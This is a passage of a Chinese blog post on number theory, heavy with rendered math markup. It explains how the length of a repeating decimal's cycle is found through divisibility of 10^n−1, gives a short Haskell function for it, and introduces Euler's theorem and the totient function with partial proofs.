class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mop"><span class="mop">lim</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">→</span><span class="mord mtight">+</span><span class="mord mtight">∞</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8247em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathnormal mtight">in</span></span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7693em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>观察到，循环节的长度 n 和分母有关，或者说由分母决定。只要能把分母转化成<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mi>n</mi></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">10^n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7477em;vertical-align:-0.0833em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>的形式，那么一定是循环小数。也就是说，对于分数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi mathvariant="normal">/</mi><mi>b</mi></mrow><annotation encoding="application/x-tex">a/b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord">/</span><span class="mord mathnormal">b</span></span></span></span>，找到正整数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span>，使得<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mi mathvariant="normal">∣</mi><mn>1</mn><msup><mn>0</mn><mi>n</mi></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">b|10^n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mord">∣1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，那么这个 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 就是循环节。</p><p>代码如下，需要避免整数溢出：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Improved version of recurCycle that utilizes an infinite list of numbers composed entirely of 9s to find the cycle length.</span></span><br><span class="line"><span class="title">recurCycleImprove</span> :: <span class="type">Integer</span> -&gt; <span class="type">Int</span></span><br><span class="line"><span class="title">recurCycleImprove</span> deno</span><br><span class="line">  | any ((== <span class="number">0</span>) . mod deno) [<span class="number">2</span>, <span class="number">5</span>] = <span class="number">0</span> <span class="comment">-- Returns 0 immediately if deno is a multiple of 2 or 5.</span></span><br><span class="line">  | otherwise = maybe <span class="number">0</span> (+ <span class="number">1</span>) (findIndex ((== <span class="number">0</span>) . (`mod` deno)) all9s) <span class="comment">-- Finds the cycle length using an index in the all9s list.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- Generates an infinite list of integers where each integer is composed entirely of 9s.</span></span><br><span class="line"><span class="title">all9s</span> :: [<span class="type">Integer</span>]</span><br><span class="line"><span class="title">all9s</span> = map (\n -&gt; <span class="number">10</span> ^ n - <span class="number">1</span>) [<span class="number">1</span> :: <span class="type">Integer</span> ..]</span><br></pre></td></tr></table></figure><h2 id="背景知识">背景知识</h2><h2 id="欧拉定理描述">欧拉定理描述</h2><p>首先学习欧拉定理（数论），欧拉定理表明，若 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo separator="true">,</mo><mi>a</mi></mrow><annotation encoding="application/x-tex">n,a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span></span></span></span> 为正整数，且互质，那么有</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>a</mi><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow></msup><mo>≡</mo><mn>1</mn><mrow><mo fence="true">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext>  </mtext><mi>n</mi><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">a^{\varphi (n)}\equiv 1\left( \mathrm{mod}\;n \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.938em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">φ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathrm">mod</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal">n</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span></span></p><p>其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mrow><mo fence="true">(</mo><mi>n</mi><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\varphi \left( n \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">n</span><span class="mclose delimcenter" style="top:0em;">)</span></span></span></span></span> 表示小于 n 的正整数中和 n 互质的数，而且满足</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>φ</mi><mrow><mo fence="true">(</mo><mi>n</mi><mo fence="true">)</mo></mrow><mo>=</mo><mi>n</mi><mo>∏</mo><mrow><mo fence="true">(</mo><mn>1</mn><mo>−</mo><mfrac><mn>1</mn><mi>p</mi></mfrac><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\varphi \left( n \right) =n\prod{\left( 1-\frac{1}{p} \right)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord mathnormal">n</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-symbol large-op" style="position:relative;top:0em;">∏</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span></span></span></span></span></span></p><p>其中 p 取 n 的所有质因子。比如说<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mn>12</mn><mo>=</mo><msup><mn>2</mn><mn>2</mn></msup><mo>×</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">n=12=2^2\times 3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">12</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8974em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span> ，互质的数为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">{</mo><mn>3</mn><mo separator="true">,</mo><mn>5</mn><mo separator="true">,</mo><mn>7</mn><mo separator="true">,</mo><mn>11</mn><mo fence="true">}</mo></mrow><annotation encoding="application/x-tex">\left\{ 3,5,7,11 \right\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">{</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">11</span><span class="mclose delimcenter" style="top:0em;">}</span></span></span></span></span>，恰好</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mn>12</mn><mo>×</mo><mrow><mo fence="true">(</mo><mn>1</mn><mo>−</mo><mfrac><mn>1</mn><mn>2</mn></mfrac><mo fence="true">)</mo></mrow><mo>×</mo><mrow><mo fence="true">(</mo><mn>1</mn><mo>−</mo><mfrac><mn>1</mn><mn>3</mn></mfrac><mo fence="true">)</mo></mrow><mo>=</mo><mn>4</mn></mrow><annotation encoding="application/x-tex">12\times \left( 1-\frac{1}{2} \right) \times \left( 1-\frac{1}{3} \right) =4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">12</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span></span></span></span></span></p><h2 id="欧拉定理证明">欧拉定理证明</h2><blockquote><p>相关背景知识，可见：<a href="https://zhuanlan.zhihu.com/p/35060143">初等数论笔记 Part 1： 欧拉定理</a></p></blockquote><p><strong>欧拉函数的证明</strong>，分成各种情况：</p><h3 id="素数幂">素数幂</h3><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><msup><mi>p</mi><mi>a</mi></msup></mrow><annotation encoding="application/x-tex">n=p^a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8588em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span></span></span></span> 显然只有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">kp</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">p</span></span></span></span> 与 n 有除 1 以外的公因数，k 取 1 到 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>p</mi><mrow><mi>a</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">p^{a-1}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0085em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 共 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>p</mi><mrow><mi>a</mi><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">p^{a-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0085em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>个数，所以</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>φ</mi><mrow><mo fence="true">(</mo><msup><mi>p</mi><mi>a</mi></msup><mo fence="true">)</mo></mrow><mo>=</mo><msup><mi>p</mi><mi>a</mi></msup><mo>−</mo><msup><mi>p</mi><mrow><mi>a</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>=</mo><msup><mi>p</mi><mi>a</mi></msup><mrow><mo fence="true">(</mo><mn>1</mn><mo>−</mo><mfrac><mn>1</mn><mi>p</mi></mfrac><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">\varphi \left( p^a \right) =p^a-p^{a-1}=p^a\left( 1-\frac{1}{p} \right)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9088em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0585em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.4em;vertical-align:-0.95em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span></span></span></span></span></p><h3 id="互质的整数的乘积">互质的整数的乘积</h3><p>如果 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 是互质的整数，则 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>m</mi><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(mn) = \varphi(m)\varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">mn</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。这是因为由于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 互质，小于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">mn</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">mn</span></span></span></span> 的整数中与 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">mn</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">mn</span></span></span></span> 互质的整数，可以通过取小于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 的与 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span> 互质的整数，与小于 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 的与 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 互质的整数，的所有可能组合来构造。</p><p>我们需要考虑由 <span class="katex"><span class="katex-mathml"><math 